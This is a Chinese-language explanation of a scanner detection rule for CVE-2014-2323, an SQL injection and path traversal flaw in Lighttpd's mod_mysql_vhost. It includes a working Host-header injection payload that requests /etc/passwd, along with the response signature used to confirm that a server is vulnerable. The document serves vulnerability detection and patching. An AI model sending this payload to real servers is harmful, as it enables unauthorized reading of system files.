# Lighttpd SQL注入与路径遍历漏洞（CVE-2014-2323）探测原理说明

## 1. 漏洞简介

Lighttpd 1.4.34及之前版本的mod_mysql_vhost.c存在SQL注入漏洞。攻击者可通过特定Host头注入SQL语句，进而获取敏感数据或远程执行命令。

## 2. 影响范围

- 受影响产品：Lighttpd < 1.4.35
- 只要未修复该漏洞的相关版本均可能被利用

## 3. 漏洞原理

该漏洞源于对Host头部参数未做有效过滤，攻击者可通过注入SQL语句，执行任意数据库操作，甚至配合路径遍历造成更大危害。

## 4. 利用方式与攻击流程

1. 攻击者构造带有SQL注入payload的Host头，向目标服务器发送请求。
2. 数据库执行恶意SQL，返回特征数据（如/etc/passwd内容）。
3. 攻击者据此判断漏洞是否存在。

## 5. 探测原理与流程（yaml 规则详细说明）

该yaml规则通过注入特征payload并检测响应内容进行无害化探测，流程如下：

### 5.1 探测请求的构造

- 发送GET请求到如下接口，Host头注入SQL：
  ```
  GET /etc/passwd HTTP/1.1
  Host: [::1]' UNION SELECT '/
  ```

### 5.2 预期响应与交互

- **HTTP响应内容**：
  - 响应体需包含`root:[x*]:0:0:`，表明成功读取/etc/passwd内容。

### 5.3 判定逻辑

- 只有当响应体中包含`root:[x*]:0:0:`，才判定目标存在SQL注入漏洞。

- **判定流程伪代码**：
  ```pseudo
  payload = "Host: [::1]' UNION SELECT '/"
  发送GET /etc/passwd，Host头为payload
  若响应体含root:[x*]:0:0:：
      判定目标存在SQL注入漏洞
  ```

- **流程图**：
  ```mermaid
  graph TD
      A[发送带payload的GET请求到/etc/passwd] --> B{响应体含root:[x*]:0:0:?}
      B -- 否 --> F[无漏洞或未触发]
      B -- 是 --> E[判定目标存在SQL注入漏洞]
  ```

通过上述流程，既保证了探测的准确性，也避免了对目标系统的实际危害。

## 6. 参考链接

- [NVD官方漏洞库](https://nvd.nist.gov/vuln/detail/CVE-2014-2323)
- [Lighttpd官方安全公告](https://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt)
- [Lighttpd 1.4.35发布说明](http://www.lighttpd.net/2014/3/12/1.4.35/)
- [Seclists安全邮件列表](http://seclists.org/oss-sec/2014/q1/561)
- [JVN安全通报](http://jvn.jp/en/jp/JVN37417423/index.html) 